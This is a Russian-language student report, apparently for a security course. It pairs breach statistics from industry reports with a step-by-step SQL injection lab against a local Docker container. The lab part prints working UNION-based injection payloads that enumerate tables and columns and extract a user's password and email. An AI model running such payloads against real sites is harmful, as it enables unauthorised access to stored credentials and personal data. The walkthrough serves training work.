### Доля успешных атак через эксплуатацию веб-уязвимостей

Найти единую метрику именно для веб-уязвимостей затруднительно: большинство источников оперируют более широкими категориями. Ниже приведена сводка по нескольким авторитетным отчётам.

| Источник | Scope | Доля атак через веб |
|---|---|---|
| **Verizon DBIR 2025** | Подтверждённые breaches, глобально, 2023–2024 | 20% breaches — через эксплуатацию уязвимостей (включая VPN/edge); ~8% относятся именно к паттерну Basic Web Application Attacks |
| **IBM X-Force 2025** | IR-кейсы за 2024 | 30% инцидентов включали эксплуатацию публично доступных приложений |
| **Google M-Trends 2025** | Mandiant IR за 2024 | 33% — эксплуатация уязвимостей как initial vector (в целом); «Web compromise» отдельно — 9% |
| **BI.ZONE WAF** | Атаки на веб-приложения российских компаний, 2024 | Статистика по типам атак (не по breaches): RCE — 36%, path traversal — 16%, XSS — 14%, SQLi — 10% |

**Вывод:** в зависимости от методологии и охвата исследования доля атак через веб-уязвимости составляет от ~8% до 30% от общего числа успешных инцидентов. Разброс обусловлен различиями в том, что именно считается «веб-атакой» (только приложения vs. включая edge/VPN).

## Часть 2. Практическое задание: SQL-инъекция

### Подготовка

Запустил Docker-контейнер, перешёл на `http://localhost:8080`. Страница предлагает ввести `id`.

---

### Шаг 1. Разведка — перебор id

Начал с очевидного запроса:

```
http://localhost:8080/task/?id=1
→ Ваш id:1  Ваш логин:admin
```

Для быстрого перебора использовал цикл в bash:

```bash
for i in $(seq 0 20); do
  echo -n "ID $i: " && curl -s "http://localhost:8080/task/?id=$i"
  echo
done
```

Получил полный список пользователей:

| id | login      |
|----|------------|
| 1  | admin      |
| 2  | Volk       |
| 3  | Matroskin  |
| 4  | Vinni-pukh |
| 5  | Neznaika   |
| 6  | kotenok    |
| 7  | Karlson    |
| 8  | Kesha      |
| 9  | Volk2      |

Записи с id ≥ 10 возвращают пустой ответ — всего 9 пользователей.

---

### Шаг 2. Проверка наличия уязвимости

Добавил одинарную кавычку к запросу:

```
http://localhost:8080/task/?id=1'
→ You have an error in your SQL syntax; check the manual that corresponds 
  to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

Сервер вернул сырую ошибку MySQL — уязвимость к SQL-инъекции подтверждена. Из текста ошибки видна структура запроса: `... WHERE id='1' LIMIT 0,1`.

---

### Шаг 3. Определение количества столбцов (ORDER BY)

Подбираю число столбцов через `ORDER BY`:

```
http://localhost:8080/task/?id=0'+ORDER+BY+1--+-  → ок
http://localhost:8080/task/?id=0'+ORDER+BY+2--+-  → ок
http://localhost:8080/task/?id=0'+ORDER+BY+3--+-  → ок
http://localhost:8080/task/?id=0'+ORDER+BY+4--+-  → Unknown column '4' in 'order clause'
```

**Вывод:** в запросе 3 столбца.

---

### Шаг 4. Получение имени базы данных

Использую несуществующий id (0), чтобы вывод был пустым и UNION подставил свои данные:

```
http://localhost:8080/task/?id=0'+UNION+SELECT+1,2,3--+-
→ Ваш id:1  Ваш логин:2
```

Поле `id` соответствует столбцу 1, поле `логин` — столбцу 2. Подставляю `database()`:

```
http://localhost:8080/task/?id=0'+UNION+SELECT+1,database(),3--+-
→ Ваш id:1  Ваш логин:security
```

**Имя базы данных: `security`**

---

### Шаг 5. Получение списка таблиц

```
http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(table_name+SEPARATOR+','),3
  +FROM+information_schema.tables+WHERE+table_schema=database()--+-
→ Ваш логин:emails,users
```

**В базе две таблицы: `emails`, `users`**

---

### Шаг 6. Получение структуры таблиц

**Таблица `users`:**

```
http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(column_name+SEPARATOR+','),3
  +FROM+information_schema.columns+WHERE+table_name='users'--+-
→ Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
```

Нужные столбцы: `id`, `username`, `password`.

**Таблица `emails`:**

```
http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(column_name+SEPARATOR+','),3
  +FROM+information_schema.columns+WHERE+table_name='emails'--+-
→ Ваш логин:id,email_id
```

---

### Шаг 7. Извлечение целевых данных

**Пароль пользователя Volk2 (id=9):**

```
http://localhost:8080/task/?id=0'+UNION+SELECT+1,password,3+FROM+users+WHERE+id=9--+-
→ Ваш логин:Wa spoiuuuuu
```

**Email пользователя Vinni-pukh (id=4):**

```
http://localhost:8080/task/?id=0'+UNION+SELECT+1,email_id,3+FROM+emails+WHERE+id=4--+-
→ Ваш логин:honey_lover@otus-lab.com
```
